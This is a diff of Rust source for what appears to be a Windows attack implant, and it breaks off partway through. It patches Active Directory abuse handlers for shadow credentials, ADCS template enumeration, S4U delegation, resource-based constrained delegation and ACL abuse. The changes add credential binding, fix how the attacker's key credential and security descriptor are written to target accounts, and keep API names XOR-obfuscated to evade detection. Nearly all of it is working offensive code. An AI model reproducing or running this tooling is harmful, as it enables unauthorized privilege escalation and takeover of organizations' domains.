@@ -1170,7 +1170,7 @@ fn wldap_base() -> Result<usize, String> {
 }
 
 #[cfg(target_os = "windows")]
-fn ldap_query_list(wldap: usize, dc: &str, base_dn: &str, filter: &str, attrs: &[&str])
+fn ldap_query_list(wldap: usize, dc: &str, base_dn: &str, filter: &str, attrs: &[&str], user: Option<&str>, pass: Option<&str>)
     -> Result<Vec<(String, Vec<(String, Vec<String>)>)>, String>
 {
     type LdapInitFn    = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
@@ -1218,7 +1218,14 @@ fn ldap_query_list(wldap: usize, dc: &str, base_dn: &str, filter: &str, attrs: &
     if ld.is_null() { return Err("ldap_init failed".into()); }
     let ver: u32 = 3;
     unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
-    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
+    let user_b: Vec<u8> = match user { Some(u) => u.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let pass_b: Vec<u8> = match pass { Some(p) => p.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let (u_ptr, p_ptr, auth_meth): (*const u8, *const u8, u32) = if user.is_some() {
+        (user_b.as_ptr(), pass_b.as_ptr(), 0x80)
+    } else {
+        (core::ptr::null(), core::ptr::null(), 0x0486)
+    };
+    let br = unsafe { fn_bind(ld, u_ptr, p_ptr, auth_meth) };
     if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind: {br:#x}")); }
 
     let base_b:   Vec<u8> = base_dn.bytes().chain(core::iter::once(0u8)).collect();
@@ -1293,7 +1300,7 @@ fn ldap_query_list(wldap: usize, dc: &str, base_dn: &str, filter: &str, attrs: &
 // mod_op: 0=ADD, 2=REPLACE; binary values passed as raw bytes.
 #[cfg(target_os = "windows")]
 fn ldap_modify_binary(wldap: usize, dc: &str, target_dn: &str,
-    attr: &str, value: &[u8], mod_op: u32) -> Result<(), String>
+    attr: &str, value: &[u8], mod_op: u32, user: Option<&str>, pass: Option<&str>) -> Result<(), String>
 {
     type LdapInitFn    = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
     type LdapSetOptFn  = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
@@ -1323,7 +1330,14 @@ fn ldap_modify_binary(wldap: usize, dc: &str, target_dn: &str,
     if ld.is_null() { return Err("ldap_init failed".into()); }
     let ver: u32 = 3;
     unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
-    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
+    let user_b: Vec<u8> = match user { Some(u) => u.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let pass_b: Vec<u8> = match pass { Some(p) => p.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let (u_ptr, p_ptr, auth_meth): (*const u8, *const u8, u32) = if user.is_some() {
+        (user_b.as_ptr(), pass_b.as_ptr(), 0x80)
+    } else {
+        (core::ptr::null(), core::ptr::null(), 0x0486)
+    };
+    let br = unsafe { fn_bind(ld, u_ptr, p_ptr, auth_meth) };
     if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind: {br:#x}")); }
 
     let dn_b:   Vec<u8> = target_dn.bytes().chain(core::iter::once(0u8)).collect();
@@ -1341,10 +1355,10 @@ fn ldap_modify_binary(wldap: usize, dc: &str, target_dn: &str,
     let bvals_arr: [*const u8; 2] = [berval_ptr, null_bv];
 
     // Build LDAPMod: mod_op(u32) + pad(u32) + mod_type(*const u8) + mod_vals(*const *const u8)
-    // = 24 bytes on x64; mod_op | 0x8000 for binary (LDAP_MOD_BVALUES)
+    // = 24 bytes on x64; mod_op | 0x80 for binary (LDAP_MOD_BVALUES)
     let mut ldap_mod = [0u8; 24];
     unsafe {
-        *(ldap_mod.as_mut_ptr() as *mut u32) = mod_op | 0x8000;
+        *(ldap_mod.as_mut_ptr() as *mut u32) = mod_op | 0x80;
         *((ldap_mod.as_mut_ptr().add(8)) as *mut *const u8) = attr_b.as_ptr();
         *((ldap_mod.as_mut_ptr().add(16)) as *mut *const *const u8) = bvals_arr.as_ptr();
     }
@@ -1375,7 +1389,11 @@ fn priv_shadow_creds(v: &serde_json::Value) -> TaskOutput {
         Some(t) => t,
         None => return TaskOutput::failure("shadow-creds: missing target"),
     };
-    let remove = v.get("remove").and_then(|b| b.as_bool()).unwrap_or(false);
+    let remove = match v.get("remove") {
+        Some(serde_json::Value::Bool(b)) => *b,
+        Some(serde_json::Value::String(s)) => s == "true",
+        _ => false,
+    };
 
     let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
         .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
@@ -1388,6 +1406,11 @@ fn priv_shadow_creds(v: &serde_json::Value) -> TaskOutput {
         .unwrap_or_else(|| domain_fqdn.clone());
     let base_dn: String = domain_fqdn.split('.')
         .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
+    let bind_user = v.get("user").and_then(|s| s.as_str())
+        .map(|u| format!("{}\\{}", domain_fqdn.split('.').next().unwrap_or("").to_uppercase(), u));
+    let bind_pass = v.get("pass").and_then(|s| s.as_str()).map(|s| s.to_string());
+    let bu = bind_user.as_deref();
+    let bp = bind_pass.as_deref();
 
     let wldap = match wldap_base() {
         Ok(b) => b,
@@ -1396,7 +1419,7 @@ fn priv_shadow_creds(v: &serde_json::Value) -> TaskOutput {
 
     // Resolve target DN
     let filter = format!("(sAMAccountName={target})");
-    let objs = match ldap_query_list(wldap, &dc, &base_dn, &filter, &["distinguishedName"]) {
+    let objs = match ldap_query_list(wldap, &dc, &base_dn, &filter, &["distinguishedName"], bu, bp) {
         Ok(r) if !r.is_empty() => r,
         Ok(_) => return TaskOutput::failure(&format!("shadow-creds: target '{target}' not found")),
         Err(e) => return TaskOutput::failure(&format!("shadow-creds: ldap lookup failed: {e}")),
@@ -1404,9 +1427,8 @@ fn priv_shadow_creds(v: &serde_json::Value) -> TaskOutput {
     let target_dn = &objs[0].0;
 
     if remove {
-        // Clear all key credentials: replace with empty list
-        // LDAP_MOD_REPLACE with no values removes the attribute
-        match ldap_modify_binary(wldap, &dc, target_dn, "msDS-KeyCredentialLink", &[], 2) {
+        // Clear all key credentials: REPLACE with empty string value list
+        match ldap_modify_str(wldap, &dc, target_dn, "msDS-KeyCredentialLink", "", 2, bu, bp) {
             Ok(()) => return TaskOutput::success(
                 serde_json::to_vec(&serde_json::json!({"status":"cleared","target":target_dn})).unwrap_or_default()
             ),
@@ -1445,17 +1467,17 @@ fn priv_shadow_creds(v: &serde_json::Value) -> TaskOutput {
     type BcCloseAlgFn = unsafe extern "system" fn(isize, u32) -> i32;
 
     // BCryptOpenAlgorithmProvider XOR 0x5A
-    let fn_open  = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x0E,0x2A,0x3F,0x34,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], BcOpenAlgFn);
+    let fn_open  = bcfn!(&[0x18,0x19,0x28,0x23,0x2A,0x2E,0x15,0x2A,0x3F,0x34,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x0A,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], BcOpenAlgFn);
     // BCryptGenerateKeyPair XOR 0x5A
-    let fn_gen   = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x1D,0x3F,0x34,0x3F,0x28,0x3B,0x2E,0x3F,0x1B,0x3F,0x23,0x0A,0x3B,0x33,0x28,0x5A], BcGenKeyFn);
+    let fn_gen   = bcfn!(&[0x18,0x19,0x28,0x23,0x2A,0x2E,0x1D,0x3F,0x34,0x3F,0x28,0x3B,0x2E,0x3F,0x11,0x3F,0x23,0x0A,0x3B,0x33,0x28,0x5A], BcGenKeyFn);
     // BCryptFinalizeKeyPair XOR 0x5A
-    let fn_final = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x1C,0x33,0x34,0x3B,0x36,0x33,0x3F,0x3F,0x1B,0x3F,0x23,0x0A,0x3B,0x33,0x28,0x5A], BcFinalFn);
+    let fn_final = bcfn!(&[0x18,0x19,0x28,0x23,0x2A,0x2E,0x1C,0x33,0x34,0x3B,0x36,0x33,0x20,0x3F,0x11,0x3F,0x23,0x0A,0x3B,0x33,0x28,0x5A], BcFinalFn);
     // BCryptExportKey XOR 0x5A
-    let fn_export= bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x1B,0x22,0x2A,0x35,0x28,0x2E,0x1B,0x3F,0x23,0x5A], BcExportFn);
+    let fn_export= bcfn!(&[0x18,0x19,0x28,0x23,0x2A,0x2E,0x1F,0x22,0x2A,0x35,0x28,0x2E,0x11,0x3F,0x23,0x5A], BcExportFn);
     // BCryptDestroyKey XOR 0x5A
-    let fn_destr = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x1E,0x3F,0x29,0x2E,0x28,0x35,0x23,0x1B,0x3F,0x23,0x5A], BcDestroyFn);
+    let fn_destr = bcfn!(&[0x18,0x19,0x28,0x23,0x2A,0x2E,0x1E,0x3F,0x29,0x2E,0x28,0x35,0x23,0x11,0x3F,0x23,0x5A], BcDestroyFn);
     // BCryptCloseAlgorithmProvider XOR 0x5A
-    let fn_close = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x19,0x36,0x35,0x29,0x3F,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], BcCloseAlgFn);
+    let fn_close = bcfn!(&[0x18,0x19,0x28,0x23,0x2A,0x2E,0x19,0x36,0x35,0x29,0x3F,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x0A,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], BcCloseAlgFn);
 
     // "RSA\0" as wide string
     let alg_id: [u16; 4] = [0x52, 0x53, 0x41, 0x00]; // R S A \0
@@ -1511,8 +1533,9 @@ fn priv_shadow_creds(v: &serde_json::Value) -> TaskOutput {
     // Build msDS-KeyCredentialLink blob
     let key_cred_link = build_key_credential_link(&pub_der);
 
-    // LDAP add the key credential link to the target account
-    match ldap_modify_binary(wldap, &dc, target_dn, "msDS-KeyCredentialLink", &key_cred_link, 0) {
+    // msDS-KeyCredentialLink is DN-Binary: must be written as "B:<hex_count>:<hex>:<dn>"
+    let dn_binary = format!("B:{}:{}:{}", key_cred_link.len() * 2, hex_encode(&key_cred_link), target_dn);
+    match ldap_modify_str(wldap, &dc, target_dn, "msDS-KeyCredentialLink", &dn_binary, 0, bu, bp) {
         Ok(()) => {},
         Err(e) => return TaskOutput::failure(&format!("shadow-creds: ldap modify failed: {e}")),
     }
@@ -1680,6 +1703,80 @@ fn build_key_credential_link(spki: &[u8]) -> Vec<u8> {
     blob
 }
 
+fn hex_encode(data: &[u8]) -> String {
+    const HEX: &[u8] = b"0123456789abcdef";
+    let mut s = String::with_capacity(data.len() * 2);
+    for b in data {
+        s.push(HEX[(b >> 4) as usize] as char);
+        s.push(HEX[(b & 0xf) as usize] as char);
+    }
+    s
+}
+
+// LDAP modify to add/replace a string (DN-Binary, etc.) attribute value.
+// mod_op: 0=ADD, 2=REPLACE; empty value string clears the attribute on REPLACE.
+#[cfg(target_os = "windows")]
+fn ldap_modify_str(wldap: usize, dc: &str, target_dn: &str,
+    attr: &str, value: &str, mod_op: u32, user: Option<&str>, pass: Option<&str>) -> Result<(), String>
+{
+    type LdapInitFn    = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
+    type LdapSetOptFn  = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
+    type LdapBindFn    = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
+    type LdapUnbindFn  = unsafe extern "system" fn(*mut u8) -> u32;
+    type LdapModFn     = unsafe extern "system" fn(*mut u8, *const u8, *const *const u8) -> u32;
+
+    macro_rules! wl { ($enc:expr, $ty:ty) => {{
+        let _n = crate::obfs::dec($enc);
+        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
+        match _p {
+            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
+            None    => return Err("wldap fn not found".into()),
+        }
+    }}}
+
+    let fn_init   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
+    let fn_setopt = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
+    let fn_bind   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
+    let fn_modify = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x35,0x3E,0x33,0x3C,0x23,0x05,0x29,0x5A], LdapModFn);
+    let fn_unbind = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
+
+    let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
+    let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
+    if ld.is_null() { return Err("ldap_init failed".into()); }
+    let ver: u32 = 3;
+    unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
+    let user_b: Vec<u8> = match user { Some(u) => u.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let pass_b: Vec<u8> = match pass { Some(p) => p.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let (u_ptr, p_ptr, auth_meth): (*const u8, *const u8, u32) = if user.is_some() {
+        (user_b.as_ptr(), pass_b.as_ptr(), 0x80)
+    } else {
+        (core::ptr::null(), core::ptr::null(), 0x0486)
+    };
+    let br = unsafe { fn_bind(ld, u_ptr, p_ptr, auth_meth) };
+    if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind: {br:#x}")); }
+
+    let dn_b:   Vec<u8> = target_dn.bytes().chain(core::iter::once(0u8)).collect();
+    let attr_b: Vec<u8> = attr.bytes().chain(core::iter::once(0u8)).collect();
+    let val_b:  Vec<u8> = value.bytes().chain(core::iter::once(0u8)).collect();
+    let vals_arr: [*const u8; 2] = if value.is_empty() {
+        [core::ptr::null(), core::ptr::null()]
+    } else {
+        [val_b.as_ptr(), core::ptr::null()]
+    };
+
+    let mut ldap_mod = [0u8; 24];
+    unsafe {
+        *(ldap_mod.as_mut_ptr() as *mut u32) = mod_op;
+        *((ldap_mod.as_mut_ptr().add(8))  as *mut *const u8)        = attr_b.as_ptr();
+        *((ldap_mod.as_mut_ptr().add(16)) as *mut *const *const u8) = vals_arr.as_ptr();
+    }
+    let mods_arr: [*const u8; 2] = [ldap_mod.as_ptr(), core::ptr::null()];
+
+    let mr = unsafe { fn_modify(ld, dn_b.as_ptr(), mods_arr.as_ptr()) };
+    unsafe { fn_unbind(ld) };
+    if mr != 0 { Err(format!("ldap_modify_s: {mr:#x}")) } else { Ok(()) }
+}
+
 // Minimal DER encoding helpers
 fn der_len(n: usize) -> Vec<u8> {
     if n < 0x80 {
@@ -1731,6 +1828,11 @@ fn priv_adcs(v: &serde_json::Value) -> TaskOutput {
     let base_dn: String = domain_fqdn.split('.')
         .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
     let config_dn = format!("CN=Configuration,{base_dn}");
+    let bind_user = v.get("user").and_then(|s| s.as_str())
+        .map(|u| format!("{}\\{}", domain_fqdn.split('.').next().unwrap_or("").to_uppercase(), u));
+    let bind_pass = v.get("pass").and_then(|s| s.as_str()).map(|s| s.to_string());
+    let bu = bind_user.as_deref();
+    let bp = bind_pass.as_deref();
 
     let wldap = match wldap_base() {
         Ok(b) => b,
@@ -1741,7 +1843,7 @@ fn priv_adcs(v: &serde_json::Value) -> TaskOutput {
     let ca_base = format!("CN=Enrollment Services,CN=Public Key Services,CN=Services,{config_dn}");
     let cas = ldap_query_list(wldap, &dc, &ca_base,
         "(objectClass=pKIEnrollmentService)",
-        &["cn","dNSHostName","certificateTemplates","msPKI-Enrollment-Servers"])
+        &["cn","dNSHostName","certificateTemplates","msPKI-Enrollment-Servers"], bu, bp)
         .unwrap_or_default();
 
     let ca_names: Vec<&str> = cas.iter().map(|(dn, _)| dn.as_str()).collect();
@@ -1752,7 +1854,7 @@ fn priv_adcs(v: &serde_json::Value) -> TaskOutput {
         "(objectClass=pKICertificateTemplate)",
         &["cn","displayName","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag",
           "msPKI-RA-Signature","msPKI-Private-Key-Flag","pKIExtendedKeyUsage",
-          "msPKI-Template-Schema-Version","nTSecurityDescriptor"])
+          "msPKI-Template-Schema-Version","nTSecurityDescriptor"], bu, bp)
     {
         Ok(r) => r,
         Err(e) => return TaskOutput::failure(&format!("adcs: template enum failed: {e}")),
@@ -1889,6 +1991,11 @@ fn priv_s4u(v: &serde_json::Value) -> TaskOutput {
         .unwrap_or_else(|| domain_fqdn.clone());
     let base_dn: String = domain_fqdn.split('.')
         .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
+    let bind_user = v.get("user").and_then(|s| s.as_str())
+        .map(|u| format!("{}\\{}", domain_fqdn.split('.').next().unwrap_or("").to_uppercase(), u));
+    let bind_pass = v.get("pass").and_then(|s| s.as_str()).map(|s| s.to_string());
+    let bu = bind_user.as_deref();
+    let bp = bind_pass.as_deref();
 
     let wldap = match wldap_base() {
         Ok(b) => b,
@@ -1906,7 +2013,7 @@ fn priv_s4u(v: &serde_json::Value) -> TaskOutput {
     let objects = match ldap_query_list(wldap, &dc, &base_dn, &filter,
         &["sAMAccountName","distinguishedName","userAccountControl",
           "msDS-AllowedToDelegateTo","msDS-AllowedToActOnBehalfOfOtherIdentity",
-          "servicePrincipalName"])
+          "servicePrincipalName"], bu, bp)
     {
         Ok(r) => r,
         Err(e) => return TaskOutput::failure(&format!("s4u: {e}")),
@@ -1971,6 +2078,11 @@ fn priv_rbcd(v: &serde_json::Value) -> TaskOutput {
         .unwrap_or_else(|| domain_fqdn.clone());
     let base_dn: String = domain_fqdn.split('.')
         .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
+    let bind_user = v.get("user").and_then(|s| s.as_str())
+        .map(|u| format!("{}\\{}", domain_fqdn.split('.').next().unwrap_or("").to_uppercase(), u));
+    let bind_pass = v.get("pass").and_then(|s| s.as_str()).map(|s| s.to_string());
+    let bu = bind_user.as_deref();
+    let bp = bind_pass.as_deref();
 
     let target = match v.get("target").and_then(|s| s.as_str()) {
         Some(t) => t,
@@ -1980,7 +2092,11 @@ fn priv_rbcd(v: &serde_json::Value) -> TaskOutput {
         Some(s) => s,
         None => return TaskOutput::failure("rbcd: missing attacker_sid"),
     };
-    let remove = v.get("remove").and_then(|b| b.as_bool()).unwrap_or(false);
+    let remove = match v.get("remove") {
+        Some(serde_json::Value::Bool(b)) => *b,
+        Some(serde_json::Value::String(s)) => s == "true",
+        _ => false,
+    };
 
     let wldap = match wldap_base() {
         Ok(b) => b,
@@ -1992,7 +2108,7 @@ fn priv_rbcd(v: &serde_json::Value) -> TaskOutput {
         target.to_string()
     } else {
         let filter = format!("(sAMAccountName={target})");
-        match ldap_query_list(wldap, &dc, &base_dn, &filter, &["distinguishedName"]) {
+        match ldap_query_list(wldap, &dc, &base_dn, &filter, &["distinguishedName"], bu, bp) {
             Ok(r) if !r.is_empty() => r[0].0.clone(),
             Ok(_) => return TaskOutput::failure(&format!("rbcd: target '{target}' not found")),
             Err(e) => return TaskOutput::failure(&format!("rbcd: ldap lookup: {e}")),
@@ -2001,7 +2117,7 @@ fn priv_rbcd(v: &serde_json::Value) -> TaskOutput {
 
     if remove {
         match ldap_modify_binary(wldap, &dc, &target_dn,
-            "msDS-AllowedToActOnBehalfOfOtherIdentity", &[], 2)
+            "msDS-AllowedToActOnBehalfOfOtherIdentity", &[], 2, bu, bp)
         {
             Ok(()) => return TaskOutput::success(
                 serde_json::to_vec(&serde_json::json!({"status":"rbcd cleared","target":target_dn}))
@@ -2023,45 +2139,56 @@ fn priv_rbcd(v: &serde_json::Value) -> TaskOutput {
             .filter_map(|p| p.parse::<u32>().ok())
             .collect()
     };
+    if sid_parts.len() < 2 { return TaskOutput::failure("rbcd: attacker_sid too short"); }
     let sub_auth_count = sid_parts.len() as u8;
     let mut sid_bytes = Vec::new();
-    sid_bytes.push(1u8);                              // Revision
-    sid_bytes.push(sub_auth_count);                   // SubAuthorityCount
-    sid_bytes.extend_from_slice(&[0, 0, 0, 0, 0, 5]); // NT Authority
+    sid_bytes.push(1u8);
+    sid_bytes.push(sub_auth_count);
+    sid_bytes.extend_from_slice(&[0u8, 0, 0, 0, 0, 5]);
     for &sa in &sid_parts { sid_bytes.extend_from_slice(&sa.to_le_bytes()); }
 
-    // Build Security Descriptor:
-    // Revision(1) + Sbz1(1) + Control(2) + OffOwner(4) + OffGroup(4) + OffSacl(4) + OffDacl(4) = 20 bytes
-    // Then DACL: AclRevision(1) + Sbz1(1) + AclSize(2) + AceCount(2) + Sbz2(2) = 8 bytes
-    // Then ACE: AceType(1=ACCESS_ALLOWED) + AceFlags(1) + AceSize(2) + AccessMask(4) + SID
-    let ace_size = (4 + 4 + sid_bytes.len()) as u16; // type+flags+size + mask + sid
-    let acl_size = 8 + ace_size as usize;
-    let dacl_off: u32 = 20;
-    let total_sd = 20 + acl_size;
+    // Build Domain Admins SID from attacker's domain prefix (all parts except last, RID=512)
+    // AD rejects msDS-AllowedToActOnBehalfOfOtherIdentity SD without owner/group fields
+    let da_sid_bytes = {
+        let mut da_parts = sid_parts.clone();
+        *da_parts.last_mut().unwrap() = 512;
+        let mut s = Vec::new();
+        s.push(1u8);
+        s.push(da_parts.len() as u8);
+        s.extend_from_slice(&[0u8, 0, 0, 0, 0, 5]);
+        for &sa in &da_parts { s.extend_from_slice(&sa.to_le_bytes()); }
+        s
+    };
 
-    let mut sd = Vec::with_capacity(total_sd);
+    let owner_off: u32 = 20;
+    let group_off: u32 = 20 + da_sid_bytes.len() as u32;
+    let dacl_off:  u32 = group_off + da_sid_bytes.len() as u32;
+    let ace_size = (8 + sid_bytes.len()) as u16;
+    let acl_size = (8 + ace_size as usize) as u16;
+
+    let mut sd = Vec::new();
     sd.push(1u8);                                           // Revision
     sd.push(0u8);                                           // Sbz1
-    sd.extend_from_slice(&0x0004u16.to_le_bytes());         // Control: SE_DACL_PRESENT
-    sd.extend_from_slice(&0u32.to_le_bytes());              // OffOwner (no owner)
-    sd.extend_from_slice(&0u32.to_le_bytes());              // OffGroup
+    sd.extend_from_slice(&0x8004u16.to_le_bytes());         // Control: SE_SELF_RELATIVE | SE_DACL_PRESENT
+    sd.extend_from_slice(&owner_off.to_le_bytes());         // OffOwner
+    sd.extend_from_slice(&group_off.to_le_bytes());         // OffGroup
     sd.extend_from_slice(&0u32.to_le_bytes());              // OffSacl
     sd.extend_from_slice(&dacl_off.to_le_bytes());          // OffDacl
-    // DACL ACL header
+    sd.extend_from_slice(&da_sid_bytes);                    // Owner (Domain Admins)
+    sd.extend_from_slice(&da_sid_bytes);                    // Group (Domain Admins)
     sd.push(2u8);                                           // AclRevision
     sd.push(0u8);                                           // Sbz1
-    sd.extend_from_slice(&(acl_size as u16).to_le_bytes()); // AclSize
+    sd.extend_from_slice(&acl_size.to_le_bytes());          // AclSize
     sd.extend_from_slice(&1u16.to_le_bytes());              // AceCount
     sd.extend_from_slice(&0u16.to_le_bytes());              // Sbz2
-    // ACE: ACCESS_ALLOWED_ACE
     sd.push(0u8);                                           // AceType = ACCESS_ALLOWED
     sd.push(0u8);                                           // AceFlags
     sd.extend_from_slice(&ace_size.to_le_bytes());          // AceSize
-    sd.extend_from_slice(&0x001f01ffu32.to_le_bytes());     // AccessMask (GENERIC_ALL)
-    sd.extend_from_slice(&sid_bytes);                       // SID
+    sd.extend_from_slice(&0x000f01ffu32.to_le_bytes());     // AccessMask
+    sd.extend_from_slice(&sid_bytes);                       // Attacker SID
 
     match ldap_modify_binary(wldap, &dc, &target_dn,
-        "msDS-AllowedToActOnBehalfOfOtherIdentity", &sd, 0)
+        "msDS-AllowedToActOnBehalfOfOtherIdentity", &sd, 2, bu, bp)
     {
         Ok(()) => {},
         Err(e) => return TaskOutput::failure(&format!("rbcd: ldap modify: {e}")),
@@ -2114,6 +2241,10 @@ fn priv_acl_abuse(v: &serde_json::Value) -> TaskOutput {
     let base_dn: String = domain.split('.')
         .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
 
+    let bind_user = v.get("user").and_then(|s| s.as_str())
+        .map(|u| format!("{}\\{}", domain.split('.').next().unwrap_or("").to_uppercase(), u));
+    let bind_pass = v.get("pass").and_then(|s| s.as_str()).map(|s| s.to_string());
+
     let wldap = match wldap_base() {
         Ok(w) => w,
         Err(e) => return TaskOutput::failure(&format!("acl-abuse: {e}")),
@@ -2122,14 +2253,14 @@ fn priv_acl_abuse(v: &serde_json::Value) -> TaskOutput {
     type LdapInitFn       = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
     type LdapSetOptFn     = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
     type LdapBindFn       = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
-    type LdapSearchFn     = unsafe extern "system" fn(*mut u8,*const u8,i32,*const u8,*const *const u8,i32,*mut *mut u8) -> u32;
+    type LdapSearchExtFn  = unsafe extern "system" fn(*mut u8,*const u8,i32,*const u8,*const *const u8,i32,*const *const u8,*const *const u8,*const u8,u32,*mut *mut u8) -> u32;
     type LdapFirstFn      = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
     type LdapGetDnFn      = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
     type LdapMemFreeFn    = unsafe extern "system" fn(*mut u8);
     type LdapGetLenValsFn = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
     type LdapLenFreeFn    = unsafe extern "system" fn(*mut *mut u8) -> u32;
     type LdapMsgFreeFn    = unsafe extern "system" fn(*mut u8) -> u32;
-    type LdapModFn        = unsafe extern "system" fn(*mut u8, *const u8, *const *const u8) -> u32;
+    type LdapModExtFn     = unsafe extern "system" fn(*mut u8, *const u8, *const *const u8, *const *const u8, *const *const u8) -> u32;
     type LdapUnbindFn     = unsafe extern "system" fn(*mut u8) -> u32;
 
     macro_rules! wl { ($enc:expr, $ty:ty) => {{
@@ -2144,14 +2275,14 @@ fn priv_acl_abuse(v: &serde_json::Value) -> TaskOutput {
     let fn_init       = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
     let fn_setopt     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
     let fn_bind       = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
-    let fn_search     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
+    let fn_search_ext = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x3F,0x22,0x2E,0x05,0x29,0x5A], LdapSearchExtFn);
     let fn_first      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
     let fn_getdn      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x3E,0x34,0x5A], LdapGetDnFn);
     let fn_memfree    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x3F,0x37,0x3C,0x28,0x3F,0x3F,0x5A], LdapMemFreeFn);
     let fn_getlenvals = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x05,0x36,0x3F,0x34,0x5A], LdapGetLenValsFn);
     let fn_lenfree    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x05,0x36,0x3F,0x34,0x5A], LdapLenFreeFn);
     let fn_msgfree    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
-    let fn_modify     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x35,0x3E,0x33,0x3C,0x23,0x05,0x29,0x5A], LdapModFn);
+    let fn_modify_ext = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x35,0x3E,0x33,0x3C,0x23,0x05,0x3F,0x22,0x2E,0x05,0x29,0x5A], LdapModExtFn);
     let fn_unbind     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
 
     let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
@@ -2159,11 +2290,31 @@ fn priv_acl_abuse(v: &serde_json::Value) -> TaskOutput {
     if ld.is_null() { return TaskOutput::failure("acl-abuse: ldap_init failed"); }
